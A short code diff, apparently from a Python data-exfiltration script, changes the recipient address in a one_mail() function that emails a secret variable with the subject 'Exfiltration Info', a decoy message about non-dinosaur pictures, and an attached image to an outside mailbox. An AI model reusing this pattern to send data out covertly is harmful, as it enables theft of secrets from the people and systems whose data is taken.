@@ -132,7 +132,7 @@ def one_mail():
     send_email(
         'living.like.bob.was.taken@gmail.com',
         secret_var,
-        'riwos15373@pngzero.com',
+        'radecab534@lewou.com',
         'Exfiltration Info',
         'Two pictures that are not at all dinosaur related.',
         './dfstd.jpg'
